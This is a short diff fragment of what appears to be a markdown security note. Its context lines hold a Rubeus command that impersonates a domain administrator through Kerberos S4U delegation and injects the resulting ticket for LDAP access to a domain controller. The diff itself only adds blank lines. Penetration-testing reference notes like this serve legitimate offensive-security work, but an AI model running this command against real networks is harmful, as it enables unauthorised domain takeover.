@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:26:11.555942+00:00'
 ```bash
 Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]
 ```
+
+
